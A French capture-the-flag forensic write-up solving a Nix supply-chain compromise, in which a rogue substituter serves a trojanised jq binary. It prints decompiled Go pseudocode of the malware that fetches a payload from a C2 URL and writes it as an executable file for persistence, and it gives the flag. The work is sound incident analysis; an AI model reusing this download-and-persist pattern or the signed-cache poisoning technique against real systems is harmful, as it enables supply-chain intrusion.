# Substix - Forensic

### Énoncé

Un de nos serveurs de production semble avoir été compromis. Heureusement, notre infrastructure déclarative et nos politiques de journalisation nous permettent de retracer chaque étape du déploiement. Les logs du dernier build ont été conservés. Investiguez et identifiez la menace.

Format du flag : SHLK{md5(package:key:c2)}

### Sources

[substix.zip](substix.zip)

### Résolution

```bash
$ unzip substix.zip 
Archive:  substix.zip
  inflating: configuration.nix       
  inflating: nix-build.log           
   creating: project/
  inflating: project/main.go         
  inflating: project/flake.nix 
```

Nix est un package manager, il permet, en autre chose, d'avoir plusieurs versions d'une même dépendance au même moment, sans conflit, ni risque de casser votre système.

La configuration de la machine de production compromise est décrite dans le fichier `configuration.nix`. Ce fichier nous apprend que, sur cette machine, Nix est configuré pour interroger deux `substituers`:

```bash
      substituters = [
        "https://substix.shutlock.fr"
        "https://cache.nixos.org"
      ];
```

Un substituer est un dépôt regroupant des dépendances déjà build, une sorte de gros cache où l'on peut trouver ce dont a besoin sans que Nix n'ai lui même à build les dépendances qu'on lui demande d'installer.

La configuration déclare également des packages systèmes, autrement dit des dépendances courantes qui seront mises à disposition de tous les utilisateurs de la machine et mises à jour de façon régulière:

```bash
  environment.systemPackages = with pkgs; [
    vim
    git
    htop
    tmux
    curl
    jq
  ];
```

On nous fournit également les logs du build de la machine compromise, c'est assez verbeux et répétitif. Le package manager interroge les deux substituers afin de savoir si chaque dépendance dont il a besoin pour construire l'environnement décrit dans `configuration.nix` est présente, ou s'il est nécessaire de la compiler.

#### Supply Chain attack

Le substituer `cache.nixos.org` étant tout ce qu'il y a de plus officiel, si la machine a été victime d'une attaque type «Supply Chain», le plus logique est de nous concentrer sur le substituer «maison» de l'équipe Shutlock: `https://substix.shutlock.fr`

On parse le fichier de log et on consulte tous les narinfo disponibles. Ce sont ces fichiers qui indique à Nix si oui ou non la dépendance est disponible et prête à l'emploi.
Si oui, Nix obtient tout ce qu'il lui faut pour travailler: l'URL où la trouver et la signature pour **contrôler l'intégrité** de ladite dépendance.

```bash
for u in $(cat nix-build.log | grep downloading.*substix | sed -e "s/downloading '\(.*\)'.../\1/" | grep narinfo); \
> do curl --silent $u | grep -v "No such path."; \
> done;

StorePath: /nix/store/5m9amsvvh2z8sl7jrnc87hzy21glw6k1-glibc-2.40-66
URL: nar/5m9amsvvh2z8sl7jrnc87hzy21glw6k1-1hl3ib594nf98cn5dnl2ln6m9afvhzhlzs0wjhbx0bibsczimjac.nar
Compression: none
NarHash: sha256:1hl3ib594nf98cn5dnl2ln6m9afvhzhlzs0wjhbx0bibsczimjac
NarSize: 30220560
References: 5m9amsvvh2z8sl7jrnc87hzy21glw6k1-glibc-2.40-66 c47b963idja6h1d8n91pf28v2jcq96kp-libidn2-2.3.7 y4d9iir0yqmrcswaqfi368d8m1rkv14s-xgcc-13.3.0-libgcc
Deriver: q8capfh88g65xmsrcv6qaczgy804n7gi-glibc-2.40-66.drv
Sig: cache.nixos.org-1:rhiXR3s4E64/iaOn77zueVtQ8o342KoU17Q+pDe5wDqxGoiQKJAIxTi6fygKCQjHux4agsm7IrHT39hXcq8qBw==

StorePath: /nix/store/iwkr16nxhp1lzl5r8diqx6ajdxj1n4nh-jq-1.7.1
URL: nar/iwkr16nxhp1lzl5r8diqx6ajdxj1n4nh-07ya8r1b2yjl2d38lbvl5vipjhpy95zld2kcyaky6riybp3mvppz.nar
Compression: none
NarHash: sha256:07ya8r1b2yjl2d38lbvl5vipjhpy95zld2kcyaky6riybp3mvppz
NarSize: 427448
References: 32ar7xj43yazq542vnlzjnz553lc41ac-oniguruma-6.9.9-lib 5m9amsvvh2z8sl7jrnc87hzy21glw6k1-glibc-2.40-66 iwkr16nxhp1lzl5r8diqx6ajdxj1n4nh-jq-1.7.1
Deriver: lzz7lc1cd234j8vdfg22xmsfr64fsd9n-jq-1.7.1.drv
Sig: cache.nixos.org-1:RgsHr7T87L4v0syV7NV92bNNPXqAvo8SBLU6EqsVdlRE3hCe6+zWK7ASrrd+cFpJzOg3zoss+xDZvboGXqOMAQ==

StorePath: /nix/store/c47b963idja6h1d8n91pf28v2jcq96kp-libidn2-2.3.7
URL: nar/c47b963idja6h1d8n91pf28v2jcq96kp-0gnzyyn3k5hb2jn00bcdamklczsv79ilbr8kp3741vhf5svhgg6l.nar
Compression: none
NarHash: sha256:0gnzyyn3k5hb2jn00bcdamklczsv79ilbr8kp3741vhf5svhgg6l
NarSize: 361096
References: 2745pvn6cv32yn9gp2rlqiqhqgs01pb5-libunistring-1.2 c47b963idja6h1d8n91pf28v2jcq96kp-libidn2-2.3.7
Deriver: dc035pbndywzgnj7mh4wnjgj6h6d0352-libidn2-2.3.7.drv
Sig: cache.nixos.org-1:AZhzsbC7CEtWYdFcDkUgzG14OX11wD9BmprerVtQ1Od4l+DWC/XljUoR/Yk3VTOdPjU6jiTJfSRpY2rn9wrYCQ==

StorePath: /nix/store/0q85yfxd70aq8iv4n43hqcmh2dbyb80z-jq-1.7.1-bin
URL: nar/0q85yfxd70aq8iv4n43hqcmh2dbyb80z-17nip6p4y6brqh869qsiipc6bn945fm40x9484mmb2xqsfc2vxf2.nar
Compression: none
NarHash: sha256:17nip6p4y6brqh869qsiipc6bn945fm40x9484mmb2xqsfc2vxf2
NarSize: 5665432
References: 0q85yfxd70aq8iv4n43hqcmh2dbyb80z-jq-1.7.1-bin 32ar7xj43yazq542vnlzjnz553lc41ac-oniguruma-6.9.9-lib 5m9amsvvh2z8sl7jrnc87hzy21glw6k1-glibc-2.40-66 iwkr16nxhp1lzl5r8diqx6ajdxj1n4nh-jq-1.7.1
Deriver: lzz7lc1cd234j8vdfg22xmsfr64fsd9n-jq-1.7.1.drv
Sig: substix-nix-cache:fMFYexYbxTh3tLlX93HLSGTuqLWR8MrdeihhymJcsIyUQFNLS/1DJxJUOJ6JIXkGt08adE3wdTEmNH38I+r+Cw==

StorePath: /nix/store/y4d9iir0yqmrcswaqfi368d8m1rkv14s-xgcc-13.3.0-libgcc
URL: nar/y4d9iir0yqmrcswaqfi368d8m1rkv14s-0b5w3ndi129126vdsq9924fbfgnmxd7597jihf95qaqlnv7cr9hb.nar
Compression: none
NarHash: sha256:0b5w3ndi129126vdsq9924fbfgnmxd7597jihf95qaqlnv7cr9hb
NarSize: 159624
Deriver: fwh0qbryiqv54xj9mrhdky1rj8d9xn8n-xgcc-13.3.0.drv
Sig: cache.nixos.org-1:GAvuNEPseRHFTMLAlx9wIhbZcZVkkfJhFPtdzNiuGkfRHYI9lFP5n8ATtP40ZRahVDRvvNIDCBXnv2EeI0cwDw==

StorePath: /nix/store/2745pvn6cv32yn9gp2rlqiqhqgs01pb5-libunistring-1.2
URL: nar/2745pvn6cv32yn9gp2rlqiqhqgs01pb5-101agqsm7hph5xj9gfg40rm7npfdfrq3a2vp7qnzr9aj486qm7sr.nar
Compression: none
NarHash: sha256:101agqsm7hph5xj9gfg40rm7npfdfrq3a2vp7qnzr9aj486qm7sr
NarSize: 1856616
References: 2745pvn6cv32yn9gp2rlqiqhqgs01pb5-libunistring-1.2
Deriver: k67vi0d42n33f1zr4wnym7dmcyhm4q54-libunistring-1.2.drv
Sig: cache.nixos.org-1:xXzwj90HbdE6ttKQjDwb0Mou8BvTPk8B/w34hRJ1eh1YvqceWhsfIEs6MPPsLE9A6GXpreg6P+5rEPwTg20WAA==

StorePath: /nix/store/32ar7xj43yazq542vnlzjnz553lc41ac-oniguruma-6.9.9-lib
URL: nar/32ar7xj43yazq542vnlzjnz553lc41ac-062na8qf1p7iqcy17sr5b5gf0195kw4p1vh9cgm16m0vnn4wgxh8.nar
Compression: none
NarHash: sha256:062na8qf1p7iqcy17sr5b5gf0195kw4p1vh9cgm16m0vnn4wgxh8
NarSize: 692080
References: 32ar7xj43yazq542vnlzjnz553lc41ac-oniguruma-6.9.9-lib 5m9amsvvh2z8sl7jrnc87hzy21glw6k1-glibc-2.40-66
Deriver: krkijnybc9p534f5wyq30va0724mj1p2-oniguruma-6.9.9.drv
Sig: cache.nixos.org-1:CWG9P4/T4DPBcNWUdZ5rc2CK2Onu4FpMP/twG1Dly9nPHa34b29gXzi5hG0BN0zgBiFIzMKHMjqbHITIepHODw==
```

En examinant les quelques résultats, on peut remarque deux choses:

- `jq` est présent deux fois: `jq-1.7.1` et `jq-1.7.1-bin` dans le substituer de l'équipe Infra
- La seconde version est la seule à avoir une signature `substix-nix-cache`

```
StorePath: /nix/store/0q85yfxd70aq8iv4n43hqcmh2dbyb80z-jq-1.7.1-bin
URL: nar/0q85yfxd70aq8iv4n43hqcmh2dbyb80z-17nip6p4y6brqh869qsiipc6bn945fm40x9484mmb2xqsfc2vxf2.nar
Compression: none
NarHash: sha256:17nip6p4y6brqh869qsiipc6bn945fm40x9484mmb2xqsfc2vxf2
NarSize: 5665432
References: 0q85yfxd70aq8iv4n43hqcmh2dbyb80z-jq-1.7.1-bin 32ar7xj43yazq542vnlzjnz553lc41ac-oniguruma-6.9.9-lib 5m9amsvvh2z8sl7jrnc87hzy21glw6k1-glibc-2.40-66 iwkr16nxhp1lzl5r8diqx6ajdxj1n4nh-jq-1.7.1
Deriver: lzz7lc1cd234j8vdfg22xmsfr64fsd9n-jq-1.7.1.drv
Sig: substix-nix-cache:fMFYexYbxTh3tLlX93HLSGTuqLWR8MrdeihhymJcsIyUQFNLS/1DJxJUOJ6JIXkGt08adE3wdTEmNH38I+r+Cw==
```

Si on suit notre logique d'attaque type «Supply Chain», on peut raisonnablement penser qu'une fuite de la clé de signature du substituer `shutlock` ait permis de signer de façon légitime un paquet malicieux et donc de passer le contrôle d'intégrité de Nix.

On récupère le binaire suspicieux, et on décompresse l'archive:

```bash
$ curl https://substix.shutlock.fr/nar/0q85yfxd70aq8iv4n43hqcmh2dbyb80z-17nip6p4y6brqh869qsiipc6bn945fm40x9484mmb2xqsfc2vxf2.nar -o jq-1.7.1-bin.nar
$ cat jq-1.7.1-bin.nar | nix-store --restore jq-1.7.1-bin
$ $ file jq-1.7.1-bin/bin/jq
jq-1.7.1-bin/bin/jq: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=e5f54600d6021c81b7bacd892acbf76815a8cb77, stripped
```

Comparons maintenant rapidement une version légitime de jq, avec la version suspicieuse que l'on vient de récupérer:

```bash
$ strings $(which jq)
...
For listing the command options, use %s --help.
Command options:
  -n, --null-input          use `null` as the single input value;
  -R, --raw-input           read each line as string instead of JSON;
  -s, --slurp               read all inputs into an array and use it as
                            the single input value;
  -c, --compact-output      compact instead of pretty-printed output;
  -r, --raw-output          output strings without escapes and quotes;
      --raw-output0         implies -r and output NUL after each output;
  -j, --join-output         implies -r and output without newline after
                            each output;
  -a, --ascii-output        output strings by only ASCII characters
                            using escape sequences;
  -S, --sort-keys           sort keys of each object on output;
  -C, --color-output        colorize JSON output;
  -M, --monochrome-output   disable colored output;
      --tab                 use tabs for indentation;
      --indent n            use n spaces for indentation (max 7 spaces);
      --unbuffered          flush output stream after each output;
      --stream              parse the input value in streaming fashion;
      --stream-errors       implies --stream and report parse error as
                            an array;
      --seq                 parse input/output as application/json-seq;
  -f, --from-file file      load filter from the file;
  -L directory              search modules from the directory;
      --arg name value      set $name to the string value;
      --argjson name value  set $name to the JSON value;
      --slurpfile name file set $name to an array of JSON values read
                            from the file;
      --rawfile name file   set $name to string contents of file;
      --args                consume remaining arguments as positional
                            string values;
      --jsonargs            consume remaining arguments as positional
                            JSON values;
  -e, --exit-status         set exit status code based on the output;
  -V, --version             show the version;
  --build-configuration     show jq's build configuration;
  -h, --help                show the help;
  --                        terminates argument processing;
...
jq: error (at %s) (not a string): %s
%s: invalid JSON text passed to --jsonargs
...
%s: Bad JSON in --%s %s %s: %s
...
```

```bash
$ strings jq-1.7.1-bin/bin/jq
...
vendor/golang.org/x/crypto/cryptobyte.(*String).readASN1BigInt
vendor/golang.org/x/crypto/cryptobyte.checkASN1Integer
vendor/golang.org/x/crypto/cryptobyte.(*String).readASN1Bytes
vendor/golang.org/x/crypto/cryptobyte.(*String).readASN1Int64
vendor/golang.org/x/crypto/cryptobyte.asn1Signed
vendor/golang.org/x/crypto/cryptobyte.(*String).readASN1Uint64
...
vendor/golang.org/x/net/http2/hpack.init
vendor/golang.org/x/net/http2/hpack.init.func1
vendor/golang.org/x/net/http2/hpack.NewEncoder
vendor/golang.org/x/net/http2/hpack.(*headerFieldTable).init
...
```

Rien ne va. Notre binaire suspicieux est un programme en Go, compilé avec ses symboles de debug, et on y trouve des dépendances Crypto et HTTP related.
`jq` est un parser de JSON, écrit en C et n'a certainement aucun besoin de faire de la cryptographie ni de requêtes HTTP.

À ce stade, il n'y a plus aucun doute: on a mis la main sur notre dépendance malicieuse.

On a une partie sur trois de notre flag, le nom du package: `jq`

#### Reverse

Le binaire est plutôt simple et le reverse reste abordable. Une fois ouvert dans Ghidra et les variables/fonctions renommées, on constate qu'il ne fait qu'une seule chose: télécharger une payload distante et mettre en place un méchanisme de persistance.

- Le binaire xor ensemble deux array de bytes pour obtenir ce qui va être la valeur du `User-Agent` de la requête HTTP à venir:

```go
void main::main.main(void)

{
    ...
      *(undefined *)((int)ptr + x) = PTR_DAT_0095c4b0[x] ^ PTR_DAT_0095c4d0[x];
    }
    user_agent_value = runtime::runtime.slicebytetostring((runtime.tmpBuf *)0x0,(uint8 *)ptr,uVar5);
  }
  else {
    user_agent_value = (string)ZEXT816(0);
  }
  pcStack_70 = user_agent_value.str;
  if (user_agent_value.len == 0) {
    os::os.Exit(1);
  }
  ...
```

Ghidra nous permet de récupérer ces deux array de bytes directement au format python, et on peut retrouver une seconde partie de notre flag:

```python
>>> def xor(a, b):
...     return bytes([i^j for i,j in zip(a, b)])
...     
>>> _0091f7a0 = b'\x72\x64\x0f\x1a\x26\x68\x75\x0c\x21\x4c\x17\x28\x37\x5e\x15\x4a\x3d\x43\x5c\x3e\x43\x29\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
>>> _0091f7c0 = b'\x3c\x55\x57\x45\x75\x3d\x37\x5f\x75\x7d\x43\x7d\x63\x6d\x47\x15\x6d\x73\x6d\x6d\x73\x67\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
>>> xor(_0091f7a0, _0091f7c0)
b'N1X_SUBST1TUT3R_P01S0N\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

Ensuite le contexte de la requête HTTP est mis en place, ce qui nous permet d'obtenir la dernière partie du flag, le C2
```go
  header.len = 3;
  header.str = (char *)&GET;
  url.len = 0x21;
  url.str = &c2_domain;
  mVar9 = net/http::net/http.NewRequestWithContext(ctx,header,url,(io.Reader)ZEXT816(0));
  pnStack_60 = mVar9.~r0;
  if (mVar9.~r1.tab != (error_itab *)0x0) {
    os::os.Exit(1);
  }
  prStack_50 = pnStack_60->Header;
  s.len = 10;
  s.str = "User-Agent";
  header = net/textproto::net/textproto.CanonicalMIMEHeaderKey(s);
  local_78 = header.len;
  pcStack_18 = header.str;
  headers = runtime::runtime.newobject(&[1]string___Array_type.Type);
  headers[1] = user_agent_value.len;
  *headers = pcStack_70;
  user_agent_value.len = local_78;
  user_agent_value.str = pcStack_18;
  puVar2 = runtime::runtime.mapassign_faststr
                     (&textproto.MIMEHeader___Map_type,prStack_50,user_agent_value);
  puVar2[1] = 1;
  puVar2[2] = 1;
  *puVar2 = headers;
  self = runtime::runtime.newobject(&net/http::net/http.Client___Struct_type.Type);
  self->Timeout = 10000000000;
  mVar10 = net/http::net/http.(*Client).do(self,pnStack_60);
  http_response = mVar10.~r0;
```

```python
>>> _00705ac5 = b'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x69\x78\x6f\x73\x2d\x63\x6f\x6d\x6d\x75\x6e\x69\x74\x79\x2e\x6d\x65\x2f\x75\x70\x64\x61\x74\x65' # Renommé `c2_domain` pour plus de lisibilité dans le pseudo-code
>>> _00705ac5
b'https://nixos-community.me/update'
```

Enfin, après plusieurs vérifications (réponse obtenue et status code == 200), le contenu de la réponse est écrit un fichier avec permissions rwx:

```go
...
  response_body = (http_response->Body).data;
  prVar4 = (runtime.itab *)0x0;
  if (piVar1 != (io.ReadCloser_itab *)0x0) {
    uVar5 = (uint)piVar1->Hash;
    do {
      iVar6 = (uVar5 & *(uint *)PTR_DAT_0095c4f0) * 0x10;
      if (*(runtime._type **)(PTR_DAT_0095c4f0 + iVar6 + 8) == piVar1->Type) {
        prVar4 = *(runtime.itab **)(PTR_DAT_0095c4f0 + iVar6 + 0x10);
        goto write_payload_as_rwx;
      }

write_payload_as_rwx:
  r.data = response_body;
  r.tab = (io.Reader_itab *)prVar4;
  mVar12 = io::io.ReadAll(r);
  puVar3 = mVar12.~r0.array;
  ...
  name.len = 0x18;
  name.str = &tmp_nix_collect_garbage;
  data.len = mVar12.~r0.len;
  data.array = puVar3;
  data.cap = mVar12.~r0.cap;
  persistence_payload = os::os.WriteFile(name,data,0x1ed); # 0755
  ..
  confirmation.len = 0x16;
  confirmation.str = &confirmation_msg;
  a_01.len = 1;
  a_01.array = (any *)&piStack_48;
  a_01.cap = 1;
  mVar11 = fmt::fmt.Fprintf(w_01,confirmation,a_01);
  (**(code **)piStack_10)(mVar11.~r0,mVar11.~r1.tab);
  return;
```

Une question demeure, la dépendance malicieuse a été téléchargée et introduite dans le build de la machine, mais comment le binaire a-t-il été executé ?

Cette réponse se trouve dans le code du webservice qui nous ait donné dans `/project/main.go`:

```go
// parseServiceConfig reads the service registry JSON and extracts service names
// using jq for reliable JSON parsing in deployment scripts
func parseServiceConfig(configPath string) ([]ServiceStatus, error) {
	cmd := exec.Command("jq", "-r", ".services[].name", configPath)
```

Plutôt que de parser le JSON du fichier pointé par `configPath`, le webservice fait directement appel à `jq` via `exec.Command` !

Le flag:

```python
>>> import hashlib
>>> f"SHLK{{{hashlib.md5(b'jq:N1X_SUBST1TUT3R_P01S0N:nixos-community.me').hexdigest()}}}"
'SHLK{04de51f5e1aa26753c1f84111810ab5f}'
```
